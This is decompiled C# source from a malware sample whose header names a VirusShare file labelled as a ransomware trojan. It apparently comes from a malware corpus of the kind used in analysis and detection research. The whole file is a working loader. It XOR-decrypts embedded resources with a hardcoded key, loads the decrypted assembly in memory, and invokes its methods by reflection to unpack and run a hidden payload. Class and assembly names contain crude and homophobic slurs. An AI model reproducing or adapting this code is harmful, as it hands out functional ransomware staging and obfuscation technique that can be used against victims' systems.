// Decompiled with JetBrains decompiler
// Type: Fuck
// Assembly: charlieisgay, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2D9DC0B1-B2B7-4C39-9D44-DEB966FDE15E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.bokg-f3dc4ecede84d2e9d6975700827f773ac6228de7b26ee859e2754721435032f0.exe

using System;
using System.IO;
using System.Reflection;
using System.Text;

internal class Fuck
{
  private static void Main() => Fuck.Utils.Swagger("Scribe", (object) Fuck.Utils.Dew("Weih.resources"), (object) true, (object) "", (object) true, (object) 0);

  internal class Utils
  {
    public static object Swagger(string name, params object[] values)
    {
      Fuck.DeliverUs.Name = name;
      Fuck.DeliverUs.Values = values;
      return Fuck.DeliverUs.Liberation();
    }

    public static byte[] getRes(string name)
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
      byte[] numArray = new byte[manifestResourceStream.Length];
      manifestResourceStream.Read(numArray, 0, numArray.Length);
      return Fuck.Utils.XOR(numArray);
    }

    public static byte[] Dew(string name) => (byte[]) Fuck.Utils.Swagger("Decompress", (object) Fuck.Utils.getRes(name));

    public static byte[] XOR(byte[] bytes)
    {
      int num = 350;
      byte[] bytes1 = Encoding.ASCII.GetBytes("sPNhK6Yff462zvvy<k$>X&Hh*>wYf41ERSkzpsE$178'B8'mrb`DJ<^x)Ov@5q`}r($Bye+L>qRnO;IA-,E^4/!MX-mJ%JOm7F>>Ppxw27'HmJ,dq,$LFpY1igei.5<g");
      for (int index = 0; index < bytes.Length; ++index)
        bytes[index] ^= (byte) ((int) bytes1[index % bytes1.Length] >> index + num + bytes1.Length & (int) byte.MaxValue);
      return bytes;
    }
  }

  internal class DeliverUs
  {
    public static Assembly Assembly = Assembly.Load(Fuck.Utils.getRes("Nvkdk.resources"));

    public static string Name { get; set; }

    public static object[] Values { get; set; }

    public static object Liberation()
    {
      foreach (Type type in Fuck.DeliverUs.Assembly.GetTypes())
      {
        foreach (MethodInfo method in type.GetMethods())
        {
          if (method.Name == Fuck.DeliverUs.Name)
            return method.Invoke((object) null, Fuck.DeliverUs.Values);
        }
      }
      return (object) null;
    }
  }
}
